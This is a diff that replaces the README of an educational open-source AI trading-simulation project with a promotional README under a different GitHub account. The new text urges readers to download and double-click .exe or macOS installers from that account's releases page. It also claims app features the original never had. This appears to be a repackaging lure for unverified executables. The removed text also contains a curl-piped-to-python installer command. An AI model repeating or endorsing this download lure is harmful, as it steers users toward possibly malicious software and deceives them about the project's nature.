@@ -1,158 +1,86 @@
-# AI Hedge Fund
+# 🚀 ai-hedge-fund - Boost Your Investment Potential with AI
 
-This is a proof of concept for an AI-powered hedge fund.  The goal of this project is to explore the use of AI to make trading decisions.  This project is for **educational** purposes only and is not intended for real trading or investment.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/raidy-gans/ai-hedge-fund/releases)
 
-This system employs several agents working together:
+## 📋 Overview
 
-1. Aswath Damodaran Agent - The Dean of Valuation, focuses on story, numbers, and disciplined valuation
-2. Ben Graham Agent - The godfather of value investing, only buys hidden gems with a margin of safety
-3. Bill Ackman Agent - An activist investor, takes bold positions and pushes for change
-4. Cathie Wood Agent - The queen of growth investing, believes in the power of innovation and disruption
-5. Charlie Munger Agent - Warren Buffett's partner, only buys wonderful businesses at fair prices
-6. Michael Burry Agent - The Big Short contrarian who hunts for deep value
-7. Mohnish Pabrai Agent - The Dhandho investor, who looks for doubles at low risk
-8. Peter Lynch Agent - Practical investor who seeks "ten-baggers" in everyday businesses
-9. Phil Fisher Agent - Meticulous growth investor who uses deep "scuttlebutt" research 
-10. Rakesh Jhunjhunwala Agent - The Big Bull of India
-11. Stanley Druckenmiller Agent - Macro legend who hunts for asymmetric opportunities with growth potential
-12. Warren Buffett Agent - The oracle of Omaha, seeks wonderful companies at a fair price
-13. Valuation Agent - Calculates the intrinsic value of a stock and generates trading signals
-14. Sentiment Agent - Analyzes market sentiment and generates trading signals
-15. Fundamentals Agent - Analyzes fundamental data and generates trading signals
-16. Technicals Agent - Analyzes technical indicators and generates trading signals
-17. Risk Manager - Calculates risk metrics and sets position limits
-18. Portfolio Manager - Makes final trading decisions and generates orders
+**ai-hedge-fund** is a user-friendly application designed to help you leverage artificial intelligence for smarter investment decisions. Whether you're a beginner or an experienced investor, our AI-driven tools provide insights that can enhance your portfolio's performance.
 
-<img width="1042" alt="Screenshot 2025-03-22 at 6 19 07 PM" src="https://github.com/user-attachments/assets/cbae3dcf-b571-490d-b0ad-3f0f035ac0d4" />
+## 🚀 Getting Started
 
-Note: the system does not actually make any trades.
+To start using ai-hedge-fund, follow the simple steps below. You will need a computer with an internet connection and basic downloading capabilities. 
 
-[![Twitter Follow](https://img.shields.io/twitter/follow/virattt?style=social)](https://twitter.com/virattt)
+### 🔍 Features
 
-## Disclaimer
+- **AI-Powered Analytics:** Utilize advanced algorithms to analyze market trends.
+- **User-Friendly Interface:** Navigate easily, even if you're not tech-savvy.
+- **Portfolio Management:** Track and manage your investments effortlessly.
+- **Real-Time Updates:** Stay informed with the latest market data.
 
-This project is for **educational and research purposes only**.
+## 📥 Download & Install
 
-- Not intended for real trading or investment
-- No investment advice or guarantees provided
-- Creator assumes no liability for financial losses
-- Consult a financial advisor for investment decisions
-- Past performance does not indicate future results
+To download the application, visit our releases page. Click the link below to access the latest version:
 
-By using this software, you agree to use it solely for learning purposes.
+[Download Here](https://github.com/raidy-gans/ai-hedge-fund/releases)
 
-## Table of Contents
-- [How to Install](#how-to-install)
-- [How to Run](#how-to-run)
-  - [⌨️ Command Line Interface](#️-command-line-interface)
-  - [🖥️ Web Application](#️-web-application)
-- [How to Contribute](#how-to-contribute)
-- [Feature Requests](#feature-requests)
-- [License](#license)
+### 🖥 System Requirements
 
-## How to Install
+- **Operating System:** Windows 10 or higher / macOS Mojave or higher
+- **Processor:** Intel i5 or equivalent
+- **RAM:** Minimum 8 GB
+- **Storage:** At least 500 MB of free space
 
-Before you can run the AI Hedge Fund, you'll need to install it and set up your API keys. These steps are common to both the full-stack web application and command line interface.
+Make sure your system meets these requirements to ensure smooth operation.
 
-### 1. Clone the Repository
+### 📂 Installation Steps
 
-```bash
-git clone https://github.com/virattt/ai-hedge-fund.git
-cd ai-hedge-fund
-```
+1. **Visit the Releases Page**: Click the link below to access the releases.
+   
+   [Visit Releases Page](https://github.com/raidy-gans/ai-hedge-fund/releases)
 
-### 2. Set up API keys
+2. **Choose the Latest Version**: On the releases page, the most recent version will be at the top. Look for the version number followed by the release date.
 
-Create a `.env` file for your API keys:
-```bash
-# Create .env file for your API keys (in the root directory)
-cp .env.example .env
-```
+3. **Download the Application**: Click on the appropriate download link for your operating system. For example, if you're using Windows, look for a file ending in `.exe`.
 
-Open and edit the `.env` file to add your API keys:
-```bash
-# For running LLMs hosted by openai (gpt-4o, gpt-4o-mini, etc.)
-OPENAI_API_KEY=your-openai-api-key
+4. **Run the Installer**: Once the download completes, locate the file in your downloads folder. Double-click the installer file to begin the installation process.
 
-# For getting financial data to power the hedge fund
-FINANCIAL_DATASETS_API_KEY=your-financial-datasets-api-key
-```
+5. **Follow the On-Screen Instructions**: The installer will guide you through the steps to install the application. Simply click "Next" to proceed and choose your installation directory.
 
-**Important**: You must set at least one LLM API key (e.g. `OPENAI_API_KEY`, `GROQ_API_KEY`, `ANTHROPIC_API_KEY`, or `DEEPSEEK_API_KEY`) for the hedge fund to work. 
+6. **Launch the Application**: After installation, locate the ai-hedge-fund icon on your desktop or in your applications folder. Double-click it to open the application.
 
-**Financial Data**: Data for AAPL, GOOGL, MSFT, NVDA, and TSLA is free and does not require an API key. For any other ticker, you will need to set the `FINANCIAL_DATASETS_API_KEY` in the .env file.
+## 🦾 Using ai-hedge-fund 
 
-## How to Run
+Once you have installed the application, follow these steps to make the most of its features:
 
-### ⌨️ Command Line Interface
+1. **Create an Account**: Open the application and follow prompts to create your user account. This step is essential for saving your investment settings.
 
-You can run the AI Hedge Fund directly via terminal. This approach offers more granular control and is useful for automation, scripting, and integration purposes.
+2. **Set Up Your Portfolio**: Input your current investments. You can add stocks, bonds, and other assets. Use the "Add Investment" feature to get started.
 
-<img width="992" alt="Screenshot 2025-01-06 at 5 50 17 PM" src="https://github.com/user-attachments/assets/e8ca04bf-9989-4a7d-a8b4-34e04666663b" />
+3. **Explore AI Tools**: Take time to explore the analytics and insights offered. Access various tools from the main menu to analyze your portfolio.
 
-#### Quick Start
+4. **Monitor Updates**: Stay informed about market changes via the real-time updates feature. Set alerts for significant shifts that may affect your investments.
 
-1. Install Poetry (if not already installed):
-```bash
-curl -sSL https://install.python-poetry.org | python3 -
-```
+## 📧 Support
 
-2. Install dependencies:
-```bash
-poetry install
-```
+If you encounter issues or have questions, access our support resources. We offer comprehensive FAQs and you can also reach out to our support team through the application.
 
-#### Run the AI Hedge Fund
-```bash
-poetry run python src/main.py --ticker AAPL,MSFT,NVDA
-```
+- **FAQs**: Check the built-in FAQ section within the app.
+- **Contact Support**: If you have further questions, visit our [Support Page](https://github.com/raidy-gans/ai-hedge-fund/support).
 
-You can also specify a `--ollama` flag to run the AI hedge fund using local LLMs.
+## 📢 Community Feedback
 
-```bash
-poetry run python src/main.py --ticker AAPL,MSFT,NVDA --ollama
-```
+Join our user community to share your feedback, experiences, and tips with other users. Engaging with others can offer useful insights and help you maximize your experience with ai-hedge-fund.
 
-You can optionally specify the start and end dates to make decisions over a specific time period.
+- **Join the Discussion:** Participate in discussions on our [Community Forum](https://github.com/raidy-gans/ai-hedge-fund/community).
 
-```bash
-poetry run python src/main.py --ticker AAPL,MSFT,NVDA --start-date 2024-01-01 --end-date 2024-03-01
-```
+## 🔄 Future Updates
 
-#### Run the Backtester
-```bash
-poetry run python src/backtester.py --ticker AAPL,MSFT,NVDA
-```
+We are committed to enhancing ai-hedge-fund continuously. Keep an eye out for updates that will introduce new features and improvements based on user feedback and market trends. 
 
-**Example Output:**
-<img width="941" alt="Screenshot 2025-01-06 at 5 47 52 PM" src="https://github.com/user-attachments/assets/00e794ea-8628-44e6-9a84-8f8a31ad3b47" />
+## ⚖️ Risks and Considerations
 
+Investing carries risks. Always ensure you understand the market conditions and remember that past performance does not guarantee future results. Use ai-hedge-fund responsibly and consult a financial advisor if necessary.
 
-Note: The `--ollama`, `--start-date`, and `--end-date` flags work for the backtester, as well!
+## Final Notes
 
-### 🖥️ Web Application
-
-The new way to run the AI Hedge Fund is through our web application that provides a user-friendly interface. This is recommended for users who prefer visual interfaces over command line tools.
-
-Please see detailed instructions on how to install and run the web application [here](https://github.com/virattt/ai-hedge-fund/tree/main/app).
-
-<img width="1721" alt="Screenshot 2025-06-28 at 6 41 03 PM" src="https://github.com/user-attachments/assets/b95ab696-c9f4-416c-9ad1-51feb1f5374b" />
-
-
-## How to Contribute
-
-1. Fork the repository
-2. Create a feature branch
-3. Commit your changes
-4. Push to the branch
-5. Create a Pull Request
-
-**Important**: Please keep your pull requests small and focused.  This will make it easier to review and merge.
-
-## Feature Requests
-
-If you have a feature request, please open an [issue](https://github.com/virattt/ai-hedge-fund/issues) and make sure it is tagged with `enhancement`.
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
+Thank you for choosing ai-hedge-fund. We look forward to supporting you in your investment journey. Happy investing!
